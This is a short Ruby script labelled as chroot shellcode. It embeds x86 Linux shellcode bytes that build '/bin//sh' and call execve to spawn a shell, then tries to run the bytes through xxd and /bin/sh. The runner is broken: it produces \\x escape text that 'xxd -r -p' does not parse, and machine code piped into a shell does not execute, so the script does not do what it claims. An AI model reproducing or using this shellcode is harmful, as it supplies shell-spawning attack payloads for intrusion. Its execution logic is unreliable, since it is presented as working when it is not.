# Chroot shellcode in Ruby
shellcode = "\x31\xdb\x31\xc9\x31\xd2\xb8\xa1\x00\x00\x00\xcd\x80" \
            "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e" \
            "\x89\xe3\x50\x89\xe2\xb0\x0b\xcd\x80"

# Print shellcode length
puts "Shellcode Length: #{shellcode.length}"

# Convert shellcode to binary and execute
binary = shellcode.each_byte.map { |b| "\\x%02x" % b }.join
exec("echo -en '#{binary}' | /usr/bin/xxd -r -p | /bin/sh")
